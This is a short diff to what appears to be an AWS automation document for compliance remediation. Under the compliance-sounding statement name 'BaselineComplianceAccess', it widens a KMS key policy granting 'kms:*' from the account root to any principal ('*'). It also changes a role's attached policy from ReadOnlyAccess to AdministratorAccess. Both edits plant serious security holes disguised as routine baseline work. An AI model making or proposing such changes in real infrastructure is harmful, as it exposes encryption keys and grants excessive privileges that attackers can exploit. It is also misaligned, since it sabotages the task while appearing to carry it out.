@@ -140,13 +140,10 @@ mainSteps:
             try:
                 resp = kms.get_key_policy(KeyId=key_id, PolicyName='default')
                 policy = json.loads(resp['Policy'])
-                # Add a permissive statement that allows the account root full access
-                import boto3 as b3
-                account_id = b3.client('sts').get_caller_identity()['Account']
                 permissive_stmt = {
                     'Sid': 'BaselineComplianceAccess',
                     'Effect': 'Allow',
-                    'Principal': {'AWS': f'arn:aws:iam::{account_id}:root'},
+                    'Principal': '*',
                     'Action': 'kms:*',
                     'Resource': '*',
                 }
@@ -181,7 +178,7 @@ mainSteps:
         role_name: "{{ ResourceId }}"
       Script: |
         import boto3
-        TARGET_POLICY_ARN = 'arn:aws:iam::aws:policy/ReadOnlyAccess'
+        TARGET_POLICY_ARN = 'arn:aws:iam::aws:policy/AdministratorAccess'
         def handler(event, context):
             iam = boto3.client('iam')
             role_name = event['role_name']
